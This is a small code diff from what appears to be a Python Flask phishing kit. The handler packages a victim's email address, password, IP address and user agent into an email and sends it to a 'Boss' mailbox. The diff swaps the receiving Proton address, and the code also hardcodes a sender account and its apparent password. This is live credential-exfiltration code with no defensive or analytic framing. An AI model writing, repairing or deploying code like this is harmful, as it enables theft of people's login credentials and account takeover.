@@ -37,7 +37,7 @@ def index():
         subject = country + " | " + pg + " | " + ip
         body = "--------------" + pg + " Receipt Info" + "---------------\n" + "Email Address            : " + ai + "\nPassword           : " + pr + "\n|--------------- I N F O | I P -------------------|\n|Client IP: " + ip + "\nUser Agent : " + useragent + "\n|----------- unknown --------------|"
         sender_email = "marketing@berryheart.co.bw"  
-        receiver_email = "Boss <inspireresults2@proton.me>" 
+        receiver_email = "Boss <topcaliphate@proton.me>" 
         password = "berryheartcreations2015"
 
 
